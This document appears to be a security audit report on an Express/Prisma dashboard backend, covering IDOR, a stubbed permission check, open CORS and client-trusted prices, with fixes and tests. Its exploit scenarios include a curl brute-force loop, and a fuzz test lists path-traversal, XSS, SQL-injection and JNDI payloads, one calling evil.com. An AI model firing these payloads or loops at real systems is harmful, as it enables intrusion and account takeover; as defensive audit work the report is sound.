# Security Audit Report - KWS Dashboard PostgreSQL
**Date:** 2025-01-XX  
**Auditor:** Senior Security Engineer  
**Scope:** OWASP Top 10 + API Security Top 10

---

## Executive Summary

This security audit identified **23 vulnerabilities** across the codebase, including **5 Critical**, **8 High**, **7 Medium**, and **3 Low** severity issues. The most critical findings are:

1. **Broken Authorization (IDOR/BOLA)** - Multiple endpoints lack proper ownership checks
2. **Placeholder Permission System** - `requirePermission` middleware is not implemented
3. **CORS Misconfiguration** - Allows all origins in production
4. **Missing Rate Limiting** - No protection against brute force or DoS attacks
5. **Business Logic Flaws** - Payment status and pricing can be manipulated

---

## Risk-Ranked Vulnerability List

### 🔴 CRITICAL (5)

#### C1: Broken Authorization - IDOR in User Management
**Location:** `backend/src/controllers/usersController.ts:101-138`  
**Route:** `GET /api/users/:id`, `PUT /api/users/:id`, `DELETE /api/users/:id`

**Vulnerability:**
- Any authenticated user can view, update, or delete any other user's data
- No ownership check: `getUser()`, `updateUser()`, `deleteUser()` only check if user exists
- `requirePermission` middleware is a placeholder (line 65-80 in `auth.ts`)

**Exploit Scenario:**
```bash
# Attacker with regular user account can:
GET /api/users/1  # View admin's email, phone, role
PUT /api/users/1  # Change admin's role to 'user'
DELETE /api/users/1  # Delete admin account
```

**Impact:** 
- Account takeover
- Privilege escalation
- PII leakage (emails, phone numbers)
- Complete system compromise

**CVSS Score:** 9.1 (Critical)

---

#### C2: Broken Authorization - IDOR in Enrollments
**Location:** `backend/src/controllers/enrollmentsController.ts:127-196, 307-439`  
**Route:** `GET /api/enrollments/:id`, `PUT /api/enrollments/:id`, `DELETE /api/enrollments/:id`

**Vulnerability:**
- Any user can view, modify, or delete any enrollment
- Payment status can be changed without authorization
- No check if user owns the enrollment or has permission

**Exploit Scenario:**
```bash
# Attacker can:
GET /api/enrollments/123  # View other students' enrollment data
PUT /api/enrollments/123 {"paymentStatus": "paid"}  # Mark unpaid as paid
PUT /api/enrollments/123 {"status": "approved"}  # Approve own enrollment
DELETE /api/enrollments/123  # Delete competitor's enrollment
```

**Impact:**
- Payment bypass (free courses)
- PII leakage (student emails, phone numbers)
- Enrollment manipulation
- Financial fraud

**CVSS Score:** 8.9 (Critical)

---

#### C3: Placeholder Permission System
**Location:** `backend/src/middleware/auth.ts:65-81`

**Vulnerability:**
```typescript
export const requirePermission = (resource: string, action: string) => {
  return async (req: AuthRequest, res: Response, next: NextFunction) => {
    // TODO: Check permission from database
    if (req.user.roleName === 'super_admin') {
      return next();
    }
    // TODO: Implement permission check from role_permissions table
    next(); // ⚠️ ALLOWS ALL USERS THROUGH
  };
};
```

**Exploit Scenario:**
- All routes using `requirePermission` are effectively unprotected
- Any authenticated user can perform any action

**Impact:**
- Complete authorization bypass
- All protected routes are accessible to any user

**CVSS Score:** 9.8 (Critical)

---

#### C4: CORS Misconfiguration
**Location:** `backend/src/index.ts:43-60`

**Vulnerability:**
```typescript
if (allowedOrigins.indexOf(origin) !== -1) {
  callback(null, true);
} else {
  console.log('CORS blocked origin:', origin);
  callback(null, true); // ⚠️ ALLOWS ALL ORIGINS
}
```

**Exploit Scenario:**
- Malicious website can make authenticated requests using user's cookies/tokens
- CSRF attacks possible

**Impact:**
- Cross-origin data theft
- CSRF attacks
- Unauthorized actions from malicious sites

**CVSS Score:** 7.5 (High) - Upgraded to Critical due to credentials: true

---

#### C5: Missing Rate Limiting
**Location:** Entire application - no rate limiting implemented

**Vulnerability:**
- `express-rate-limit` is installed but never used
- No protection against brute force attacks on login
- No protection against DoS attacks

**Exploit Scenario:**
```bash
# Brute force login
for i in {1..10000}; do
  curl -X POST /api/auth/login -d '{"email":"admin@example.com","password":"guess$i"}'
done

# DoS on expensive endpoints
for i in {1..1000}; do
  curl /api/reports/all
done
```

**Impact:**
- Account enumeration
- Brute force password attacks
- DoS attacks
- Resource exhaustion

**CVSS Score:** 7.3 (High) - Upgraded to Critical for login endpoint

---

### 🟠 HIGH (8)

#### H1: Business Logic Flaw - Payment Status Manipulation
**Location:** `backend/src/controllers/enrollmentsController.ts:307-348`

**Vulnerability:**
- Payment status can be set to "paid" without actual payment verification
- No server-side validation that payment was processed

**Impact:** Free course access, financial fraud

---

#### H2: Business Logic Flaw - Client-Side Price Calculation
**Location:** `backend/src/controllers/bookSalesController.ts:119`

**Vulnerability:**
```typescript
const totalAmount = items.reduce((sum, i) => sum + i.qty * i.unitPrice, 0);
// ⚠️ Uses client-provided unitPrice
```

**Exploit Scenario:**
- Attacker sends `{"items": [{"bookId": "xxx", "qty": 1, "unitPrice": 0.01}]}`
- Server should fetch price from database, not trust client

**Impact:** Financial fraud, revenue loss

---

#### H3: Missing Input Validation
**Location:** Multiple controllers

**Vulnerability:**
- `usersController.ts`: No validation on `roleId`, `status` values
- `enrollmentsController.ts`: No validation on `paymentStatus` enum
- `menuPermissionsController.ts`: No validation on `roleId` in params

**Impact:** Data corruption, injection attacks, business logic bypass

---

#### H4: Information Disclosure in Error Messages
**Location:** `backend/src/middleware/errorHandler.ts:80-95`

**Vulnerability:**
- Development mode exposes stack traces, database errors, file paths
- Production may leak sensitive information

**Impact:** Information disclosure, system reconnaissance

---

#### H5: Weak Password Requirements
**Location:** `backend/src/controllers/usersController.ts:287-289`

**Vulnerability:**
```typescript
if (newPassword.length < 6) {
  throw new AppError('New password must be at least 6 characters long', 400);
}
```

**Impact:** Weak passwords, easier brute force

---

#### H6: No CSRF Protection
**Location:** Entire application

**Vulnerability:**
- Using JWT in Authorization header (good), but no CSRF tokens
- If cookies are used in future, CSRF protection needed

**Impact:** Cross-site request forgery

---

#### H7: File Upload Security Gaps
**Location:** `backend/src/controllers/lecturesController.ts:100-156`

**Vulnerability:**
- File type validation relies on MIME type (can be spoofed)
- No virus scanning
- No file content validation (magic bytes)

**Impact:** Malicious file uploads, XSS via SVG, server compromise

---

#### H8: Missing Audit Logging for Sensitive Actions
**Location:** Multiple controllers

**Vulnerability:**
- Some actions log to `activityLog`, but not all sensitive operations
- No logging for permission changes, role updates, financial transactions

**Impact:** No accountability, difficult to detect breaches

---

### 🟡 MEDIUM (7)

#### M1: JWT Token Expiration Too Long
**Location:** `backend/src/controllers/authController.ts:50`

**Vulnerability:**
- Default expiration: 15 minutes (acceptable)
- Refresh token: 7 days (too long if not revocable)

**Impact:** Stolen token remains valid for 7 days

---

#### M2: No Refresh Token Revocation
**Location:** `backend/src/controllers/authController.ts:76, 159`

**Vulnerability:**
- TODO comments indicate refresh tokens not stored in database
- Cannot revoke tokens on logout or compromise

**Impact:** Stolen tokens remain valid until expiration

---

#### M3: SQL Injection Risk (Low - Prisma protects, but parameterized queries needed)
**Location:** Query building in controllers

**Vulnerability:**
- Prisma ORM provides protection, but raw queries could be vulnerable
- No evidence of raw queries, but should be documented

**Impact:** SQL injection if raw queries added

---

#### M4: Directory Traversal in File Access
**Location:** `backend/src/middleware/fileSecurity.ts:13`

**Vulnerability:**
- Path normalization may not catch all traversal attempts
- Should use `path.resolve()` and check against allowed directory

**Impact:** Unauthorized file access

---

#### M5: Missing HTTPS Enforcement
**Location:** No HTTPS redirect or HSTS headers

**Vulnerability:**
- No enforcement of HTTPS in production
- Sensitive data could be transmitted over HTTP

**Impact:** Man-in-the-middle attacks

---

#### M6: Weak Session Management
**Location:** JWT implementation

**Vulnerability:**
- No token rotation
- No device fingerprinting
- No concurrent session limits

**Impact:** Session hijacking, account takeover

---

#### M7: Missing Security Headers
**Location:** `backend/src/index.ts:29-32`

**Vulnerability:**
- Helmet is configured but may not have all recommended headers
- Missing: `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`

**Impact:** XSS, clickjacking, MIME sniffing

---

### 🟢 LOW (3)

#### L1: Verbose Error Logging
**Location:** `backend/src/middleware/errorHandler.ts:63-74`

**Vulnerability:**
- Logs full request details including potentially sensitive data
- Should sanitize logs

**Impact:** Information leakage in logs

---

#### L2: Missing Content Security Policy
**Location:** No CSP headers

**Vulnerability:**
- No CSP headers configured
- XSS protection incomplete

**Impact:** XSS attacks

---

#### L3: Insecure Defaults
**Location:** Various

**Vulnerability:**
- Default role assignment (line 172 in usersController)
- Default status values

**Impact:** Misconfiguration risks

---

## Secure Architecture Recommendations

### 1. Authentication & Authorization Model

**Current State:**
- JWT-based authentication ✅
- Role-based access control (RBAC) partially implemented
- Permission-based access control (ABAC) not implemented

**Recommended Architecture:**

```
┌─────────────────────────────────────────┐
│         Authentication Layer            │
│  - JWT validation                        │
│  - Token refresh with revocation        │
│  - Rate limiting on auth endpoints      │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│         Authorization Layer             │
│  - Role-based checks (RBAC)             │
│  - Permission-based checks (ABAC)        │
│  - Resource ownership checks             │
│  - Object-level authorization           │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│         Business Logic Layer            │
│  - Input validation                      │
│  - Business rule enforcement             │
│  - Audit logging                         │
└─────────────────────────────────────────┘
```

**Implementation Pattern:**

```typescript
// Middleware chain
authenticate → requireRole → requirePermission → checkOwnership → controller
```

### 2. RBAC/ABAC Implementation

**Database Schema:**
```sql
-- Already exists: roles, permissions, role_permissions
-- Need to populate and use them

-- Example permissions:
INSERT INTO permissions (name, resource, action) VALUES
  ('users.view', 'users', 'view'),
  ('users.create', 'users', 'create'),
  ('users.update', 'users', 'update'),
  ('users.delete', 'users', 'delete'),
  ('users.update.own', 'users', 'update_own'),  -- Can update own profile
  ('enrollments.view', 'enrollments', 'view'),
  ('enrollments.view.own', 'enrollments', 'view_own'),
  ('finance.view', 'finance', 'view'),
  ('finance.create', 'finance', 'create');
```

**Middleware Implementation:**
```typescript
export const requirePermission = (resource: string, action: string) => {
  return async (req: AuthRequest, res: Response, next: NextFunction) => {
    if (!req.user) {
      return next(new AppError('Authentication required', 401));
    }

    // Super admin bypass
    if (req.user.roleName === 'super_admin') {
      return next();
    }

    // Check permission from database
    const permission = await prisma.permission.findFirst({
      where: {
        resource,
        action,
        rolePermissions: {
          some: {
            roleId: req.user.roleId
          }
        }
      }
    });

    if (!permission) {
      return next(new AppError('Insufficient permissions', 403));
    }

    next();
  };
};
```

### 3. Object Ownership Checks

**Pattern for Resource Ownership:**
```typescript
export const checkOwnership = (resourceType: 'user' | 'enrollment' | 'lecture') => {
  return async (req: AuthRequest, res: Response, next: NextFunction) => {
    const resourceId = parseInt(req.params.id);
    const userId = req.user!.id;

    let isOwner = false;

    switch (resourceType) {
      case 'user':
        isOwner = resourceId === userId;
        break;
      case 'enrollment':
        const enrollment = await prisma.enrollment.findUnique({
          where: { id: resourceId },
          select: { userId: true }
        });
        isOwner = enrollment?.userId === userId;
        break;
      // ... other resource types
    }

    // Allow if owner OR has admin role
    if (!isOwner && req.user!.roleName !== 'super_admin' && req.user!.roleName !== 'admin') {
      return next(new AppError('Access denied', 403));
    }

    next();
  };
};
```

### 4. Recommended Middleware Stack

```typescript
// Global middleware (app.ts)
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
}));

// Route-specific middleware
router.get('/:id', 
  authenticate,
  requirePermission('users', 'view'),
  checkOwnership('user'),  // Optional: allow if own or admin
  getUser
);
```

---

## Concrete Code Patches

### Patch 1: Fix IDOR in Users Controller

**File:** `backend/src/controllers/usersController.ts`

**Changes:**
1. Add ownership check in `getUser()`
2. Add ownership check in `updateUser()`
3. Prevent role escalation in `updateUser()`
4. Add admin-only check in `deleteUser()`

---

### Patch 2: Fix IDOR in Enrollments Controller

**File:** `backend/src/controllers/enrollmentsController.ts`

**Changes:**
1. Add ownership check in `getEnrollment()`
2. Add authorization check in `updateEnrollment()`
3. Prevent payment status manipulation without proper role
4. Add server-side payment verification

---

### Patch 3: Implement Permission System

**File:** `backend/src/middleware/auth.ts`

**Changes:**
1. Implement `requirePermission()` to query database
2. Add caching for performance
3. Add permission check logging

---

### Patch 4: Add Rate Limiting

**File:** `backend/src/index.ts`

**Changes:**
1. Add global rate limiter
2. Add strict rate limiter for auth endpoints
3. Add rate limiter for file uploads

---

### Patch 5: Fix CORS Configuration

**File:** `backend/src/index.ts`

**Changes:**
1. Remove "allow all origins" fallback
2. Add environment-based origin whitelist
3. Add CORS preflight caching

---

## Security Controls Implementation

### 1. Rate Limiting

```typescript
import rateLimit from 'express-rate-limit';

// General API rate limit
export const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

// Strict rate limit for auth endpoints
export const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 login attempts per 15 minutes
  skipSuccessfulRequests: true,
  message: 'Too many login attempts, please try again later.',
});
```

### 2. Input Validation Schemas

```typescript
// backend/src/validators/usersValidator.ts
import { z } from 'zod';

export const createUserSchema = z.object({
  email: z.string().email().max(255),
  password: z.string().min(8).regex(/[A-Z]/, 'Password must contain uppercase')
    .regex(/[a-z]/, 'Password must contain lowercase')
    .regex(/[0-9]/, 'Password must contain number')
    .regex(/[^A-Za-z0-9]/, 'Password must contain special character'),
  firstName: z.string().max(100).optional(),
  lastName: z.string().max(100).optional(),
  phone: z.string().max(20).optional(),
  roleId: z.number().int().positive(),
  status: z.enum(['active', 'suspended', 'archived'])
});

export const updateUserSchema = z.object({
  firstName: z.string().max(100).optional(),
  lastName: z.string().max(100).optional(),
  phone: z.string().max(20).optional(),
  roleId: z.number().int().positive().optional(),
  status: z.enum(['active', 'suspended', 'archived']).optional()
}).refine(
  (data) => Object.keys(data).length > 0,
  'At least one field must be provided'
);
```

### 3. Server-Side Price Recalculation

```typescript
// backend/src/controllers/bookSalesController.ts
export const createBookSale = async (req: AuthRequest, res: Response, next: NextFunction) => {
  // ... validation ...

  // ⚠️ FIX: Fetch prices from database, don't trust client
  const bookIds = [...new Set(items.map((i) => i.bookId))];
  const books = await prisma.book.findMany({
    where: { id: { in: bookIds } },
    select: { id: true, salePrice: true, costPrice: true }  // Get salePrice from DB
  });

  const bookPriceMap = new Map(books.map((b) => [b.id, Number(b.salePrice)]));
  
  // Recalculate using server-side prices
  let totalAmount = 0;
  for (const item of items) {
    const serverPrice = bookPriceMap.get(item.bookId);
    if (!serverPrice) {
      throw new AppError(`Book ${item.bookId} not found`, 404);
    }
    totalAmount += item.qty * serverPrice;  // Use server price, not client price
  }

  // ... rest of logic ...
};
```

### 4. Secure Headers

```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

### 5. CORS Configuration

```typescript
const corsOptions = {
  origin: (origin: string | undefined, callback: (err: Error | null, allow?: boolean) => void) => {
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin && process.env.NODE_ENV === 'development') {
      return callback(null, true);
    }
    
    if (!origin) {
      return callback(new Error('CORS: Origin required in production'), false);
    }
    
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      console.error('CORS blocked origin:', origin);
      callback(new Error('Not allowed by CORS'), false);  // ⚠️ FIX: Don't allow all
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400, // 24 hours
  preflightContinue: false,
  optionsSuccessStatus: 204
};
```

### 6. Error Handling

```typescript
export const errorHandler = (err: Error | AppError, req: Request, res: Response, next: NextFunction) => {
  // ... existing code ...

  // ⚠️ FIX: Don't expose sensitive information
  const isDevelopment = process.env.NODE_ENV === 'development';
  
  let errorMessage = 'Internal server error';
  let statusCode = 500;
  
  if (err instanceof AppError) {
    errorMessage = err.message;
    statusCode = err.statusCode;
  } else if (isDevelopment) {
    errorMessage = err.message;
  }
  
  // Log full error details server-side only
  console.error('Error:', {
    message: err.message,
    stack: err.stack,
    url: req.originalUrl,
    method: req.method,
    userId: (req as any).user?.id,
    // Don't log request body in production (may contain passwords)
    ...(isDevelopment && { body: req.body })
  });
  
  res.status(statusCode).json({
    success: false,
    message: errorMessage,
    ...(isDevelopment && {
      error: {
        type: err.constructor.name,
        stack: err.stack
      }
    })
  });
};
```

---

## Test Plan

### 1. Unit Tests for Access Control

```typescript
// backend/src/__tests__/auth.test.ts
describe('Authorization', () => {
  it('should deny access to other user\'s data', async () => {
    const user1 = await createTestUser({ roleId: 4 }); // regular user
    const user2 = await createTestUser({ roleId: 4 });
    
    const token = await loginUser(user1);
    
    const response = await request(app)
      .get(`/api/users/${user2.id}`)
      .set('Authorization', `Bearer ${token}`);
    
    expect(response.status).toBe(403);
  });

  it('should allow admin to view any user', async () => {
    const admin = await createTestUser({ roleId: 1 }); // admin
    const user = await createTestUser({ roleId: 4 });
    
    const token = await loginUser(admin);
    
    const response = await request(app)
      .get(`/api/users/${user.id}`)
      .set('Authorization', `Bearer ${token}`);
    
    expect(response.status).toBe(200);
  });
});
```

### 2. Integration Tests for IDOR

```typescript
describe('IDOR Protection', () => {
  it('should prevent user from updating other user\'s enrollment', async () => {
    const user1 = await createTestUser();
    const user2 = await createTestUser();
    const enrollment = await createEnrollment({ userId: user2.id });
    
    const token = await loginUser(user1);
    
    const response = await request(app)
      .put(`/api/enrollments/${enrollment.id}`)
      .set('Authorization', `Bearer ${token}`)
      .send({ paymentStatus: 'paid' });
    
    expect(response.status).toBe(403);
  });

  it('should prevent payment status manipulation without proper role', async () => {
    const user = await createTestUser({ roleId: 4 }); // regular user
    const enrollment = await createEnrollment({ userId: user.id });
    
    const token = await loginUser(user);
    
    const response = await request(app)
      .put(`/api/enrollments/${enrollment.id}`)
      .set('Authorization', `Bearer ${token}`)
      .send({ paymentStatus: 'paid' });
    
    expect(response.status).toBe(403);
  });
});
```

### 3. Negative Test Cases

```typescript
describe('Negative Test Cases', () => {
  it('should reject invalid JWT token', async () => {
    const response = await request(app)
      .get('/api/users')
      .set('Authorization', 'Bearer invalid-token');
    
    expect(response.status).toBe(401);
  });

  it('should reject request with missing authorization header', async () => {
    const response = await request(app)
      .get('/api/users');
    
    expect(response.status).toBe(401);
  });

  it('should reject invalid input data', async () => {
    const admin = await createTestUser({ roleId: 1 });
    const token = await loginUser(admin);
    
    const response = await request(app)
      .post('/api/users')
      .set('Authorization', `Bearer ${token}`)
      .send({
        email: 'not-an-email',
        password: '123' // too short
      });
    
    expect(response.status).toBe(400);
  });

  it('should enforce rate limiting', async () => {
    const requests = Array(101).fill(null).map(() =>
      request(app).get('/api/users')
    );
    
    const responses = await Promise.all(requests);
    const rateLimited = responses.find(r => r.status === 429);
    
    expect(rateLimited).toBeDefined();
  });
});
```

### 4. Fuzz Testing

```typescript
describe('Fuzz Testing', () => {
  const fuzzInputs = [
    null,
    undefined,
    '',
    ' ',
    'null',
    'undefined',
    -1,
    0,
    999999999,
    'abc',
    '../../etc/passwd',
    '<script>alert(1)</script>',
    '${jndi:ldap://evil.com/a}',
    '1 OR 1=1',
    '1; DROP TABLE users;--'
  ];

  it('should handle fuzzed user IDs', async () => {
    const admin = await createTestUser({ roleId: 1 });
    const token = await loginUser(admin);
    
    for (const input of fuzzInputs) {
      const response = await request(app)
        .get(`/api/users/${input}`)
        .set('Authorization', `Bearer ${token}`);
      
      // Should not crash, should return 400 or 404
      expect([400, 404]).toContain(response.status);
    }
  });
});
```

### 5. Business Logic Tests

```typescript
describe('Business Logic', () => {
  it('should recalculate prices server-side for book sales', async () => {
    const book = await createBook({ salePrice: 100, costPrice: 50 });
    const admin = await createTestUser({ roleId: 1 });
    const token = await loginUser(admin);
    
    // Try to send manipulated price
    const response = await request(app)
      .post('/api/v1/book-sales')
      .set('Authorization', `Bearer ${token}`)
      .send({
        soldAt: new Date().toISOString(),
        paymentMethod: 'CASH',
        items: [{
          bookId: book.id,
          qty: 1,
          unitPrice: 0.01  // Try to set very low price
        }]
      });
    
    expect(response.status).toBe(201);
    // Server should use book.salePrice (100), not client price (0.01)
    expect(response.body.data.totalAmount).toBe(100);
  });
});
```

---

## Implementation Priority

### Phase 1: Critical Fixes (Week 1)
1. ✅ Fix IDOR vulnerabilities (C1, C2)
2. ✅ Implement permission system (C3)
3. ✅ Add rate limiting (C5)
4. ✅ Fix CORS (C4)

### Phase 2: High Priority (Week 2)
1. Fix business logic flaws (H1, H2)
2. Add input validation (H3)
3. Improve error handling (H4)
4. Strengthen password requirements (H5)

### Phase 3: Medium Priority (Week 3)
1. Implement refresh token revocation (M2)
2. Add security headers (M7)
3. Improve file upload security (H7)
4. Add audit logging (H8)

### Phase 4: Low Priority (Week 4)
1. Add CSP headers (L2)
2. Improve logging (L1)
3. Review default configurations (L3)

---

## Conclusion

This security audit identified critical vulnerabilities that could lead to complete system compromise. The most urgent issues are:

1. **Broken authorization** allowing any user to access/modify any resource
2. **Placeholder permission system** that allows all authenticated users through
3. **Missing rate limiting** exposing the system to brute force and DoS attacks

**Recommended Action:** Implement Phase 1 fixes immediately before production deployment.

**Next Steps:**
1. Review and approve this report
2. Prioritize fixes based on business impact
3. Implement fixes following the provided code patches
4. Run security tests to verify fixes
5. Schedule penetration testing after fixes are deployed

---

**Report Generated:** 2025-01-XX  
**Next Review:** After Phase 1 implementation

